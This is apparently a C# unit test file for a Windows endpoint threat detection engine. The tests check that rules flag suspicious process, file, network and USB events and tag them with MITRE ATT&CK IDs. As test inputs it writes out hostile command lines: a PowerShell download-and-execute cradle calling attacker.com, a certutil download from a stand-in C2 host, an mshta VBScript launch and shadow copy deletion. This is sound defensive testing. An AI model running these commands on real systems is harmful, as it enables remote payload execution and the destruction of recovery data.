using LocalSentinel.Models;
using LocalSentinel.Services;
using System;
using System.IO;
using System.Linq;
using Xunit;

namespace LocalSentinel.Tests
{
    public class ThreatDetectionEngineTests
    {
        private readonly ThreatDetectionEngine engine;
        private readonly string testTempDir;
        private readonly string testDownloadsDir;
        private readonly string testStartupDir;

        public ThreatDetectionEngineTests()
        {
            testTempDir = @"C:\Mock\AppData\Local\Temp";
            testDownloadsDir = @"C:\Mock\Users\Operator\Downloads";
            testStartupDir = @"C:\Mock\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";

            engine = new ThreatDetectionEngine(testTempDir, testDownloadsDir, testStartupDir);
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_ObfuscatedPowerShell_EncodedCommand()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "powershell.exe",
                ProcessId = 4412,
                CommandLine = "powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
                ExecutablePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.NotEmpty(alerts);
            var alert = alerts.First();
            Assert.Equal("RULE-PROC-001", alert.RuleId);
            Assert.Equal(AlertSeverity.Critical, alert.Severity);
            Assert.Equal("T1059.001", alert.MitreTechniqueId);
            Assert.Equal("Execution", alert.MitreTactic);
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_HiddenDownloadCradle()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "pwsh.exe",
                ProcessId = 8820,
                CommandLine = "pwsh.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1') | IEX",
                ExecutablePath = @"C:\Program Files\PowerShell\7\pwsh.exe"
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.NotEmpty(alerts);
            var alert = alerts.First();
            Assert.Equal("RULE-PROC-001", alert.RuleId);
            Assert.Equal(AlertSeverity.High, alert.Severity);
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_CertutilIngressAbuse()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "certutil.exe",
                ProcessId = 2048,
                CommandLine = "certutil.exe -urlcache -split -f http://malicious.c2/beacon.exe beacon.exe",
                ExecutablePath = @"C:\Windows\System32\certutil.exe"
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-PROC-002" && a.MitreTechniqueId == "T1105");
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_MshtaRemoteScript()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "mshta.exe",
                ProcessId = 9120,
                CommandLine = "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc\"\",0,True\"))",
                ExecutablePath = @"C:\Windows\System32\mshta.exe"
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-PROC-002" && a.MitreTechniqueId == "T1218.005");
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_ShadowCopyDeletion()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "vssadmin.exe",
                ProcessId = 3100,
                CommandLine = "vssadmin.exe delete shadows /all /quiet",
                ExecutablePath = @"C:\Windows\System32\vssadmin.exe"
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-PROC-003" && a.Severity == AlertSeverity.Critical && a.MitreTechniqueId == "T1490");
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_UnsignedBinaryInDownloads()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "sketchy_installer.exe",
                ProcessId = 11200,
                ExecutablePath = Path.Combine(testDownloadsDir, "sketchy_installer.exe"),
                SignatureStatus = "Unsigned",
                SignatureTrusted = false
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-PROC-004" && a.Severity == AlertSeverity.Medium && a.MitreTechniqueId == "T1204.002");
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_MasqueradingDoubleExtension()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "Quarterly_Report.pdf.exe",
                ProcessId = 5510,
                ExecutablePath = Path.Combine(testDownloadsDir, "Quarterly_Report.pdf.exe"),
                SignatureStatus = "Unsigned",
                SignatureTrusted = false
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-PROC-005" && a.MitreTechniqueId == "T1036.007");
        }

        [Fact]
        public void EvaluateProcessEvent_Detects_OfficeSpawningShell()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "cmd.exe",
                ProcessId = 7712,
                ParentProcessName = "WINWORD.EXE",
                ParentProcessId = 4400,
                CommandLine = "cmd.exe /c whoami",
                ExecutablePath = @"C:\Windows\System32\cmd.exe"
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-PROC-006" && a.MitreTechniqueId == "T1059.003");
        }

        [Fact]
        public void EvaluateProcessEvent_Ignores_LegitimateProcess()
        {
            var record = new ProcessEventRecord
            {
                ProcessName = "notepad.exe",
                ProcessId = 3200,
                ExecutablePath = @"C:\Windows\System32\notepad.exe",
                CommandLine = "notepad.exe notes.txt",
                SignatureStatus = "Signed",
                SignatureTrusted = true
            };

            var alerts = engine.EvaluateProcessEvent(record);

            Assert.Empty(alerts);
        }

        [Fact]
        public void EvaluateFileEvent_Detects_RansomwareExtension()
        {
            var record = new FileEventRecord
            {
                EventType = "Created",
                FileName = "financials.xlsx.locked",
                FullPath = @"C:\Users\Operator\Documents\financials.xlsx.locked"
            };

            var alerts = engine.EvaluateFileEvent(record);

            Assert.NotEmpty(alerts);
            var alert = alerts.First();
            Assert.Equal("RULE-FILE-001", alert.RuleId);
            Assert.Equal(AlertSeverity.Critical, alert.Severity);
            Assert.Equal("T1486", alert.MitreTechniqueId);
        }

        [Fact]
        public void EvaluateFileEvent_Detects_StartupFolderPersistence()
        {
            var record = new FileEventRecord
            {
                EventType = "Created",
                FileName = "update_service.exe",
                FullPath = Path.Combine(testStartupDir, "update_service.exe")
            };

            var alerts = engine.EvaluateFileEvent(record);

            Assert.NotEmpty(alerts);
            var alert = alerts.First();
            Assert.Equal("RULE-FILE-002", alert.RuleId);
            Assert.Equal(AlertSeverity.High, alert.Severity);
            Assert.Equal("T1547.001", alert.MitreTechniqueId);
        }

        [Fact]
        public void EvaluateNetworkEvent_Detects_C2PortConnection()
        {
            var record = new NetworkEventRecord
            {
                ProcessName = "beacon.exe",
                ProcessId = 9988,
                Protocol = "TCPv4",
                LocalAddress = "192.168.1.50",
                LocalPort = 51234,
                RemoteAddress = "198.51.100.44",
                RemotePort = 4444, // Metasploit Default
                ConnectionState = "Established"
            };

            var alerts = engine.EvaluateNetworkEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-NET-001" && a.MitreTechniqueId == "T1071");
        }

        [Fact]
        public void EvaluateNetworkEvent_Detects_PowerShellOutboundSocket()
        {
            var record = new NetworkEventRecord
            {
                ProcessName = "powershell.exe",
                ProcessId = 6120,
                Protocol = "TCPv4",
                LocalAddress = "10.0.0.15",
                LocalPort = 59123,
                RemoteAddress = "203.0.113.88",
                RemotePort = 8080,
                ConnectionState = "Established"
            };

            var alerts = engine.EvaluateNetworkEvent(record);

            Assert.Contains(alerts, a => a.RuleId == "RULE-NET-002" && a.MitreTechniqueId == "T1071.001");
        }

        [Fact]
        public void EvaluateUsbEvent_Detects_RemovableStorageAttached()
        {
            var record = new UsbEventRecord
            {
                EventType = "Connected",
                DeviceName = "SanDisk Ultra USB 3.0",
                SerialNumber = "4C530001230415112345",
                PnpDeviceId = @"USB\VID_0781&PID_5581\4C530001230415112345"
            };

            var alerts = engine.EvaluateUsbEvent(record);

            Assert.NotEmpty(alerts);
            var alert = alerts.First();
            Assert.Equal("RULE-USB-001", alert.RuleId);
            Assert.Equal(AlertSeverity.Low, alert.Severity);
            Assert.Equal("T1200", alert.MitreTechniqueId);
        }
    }
}

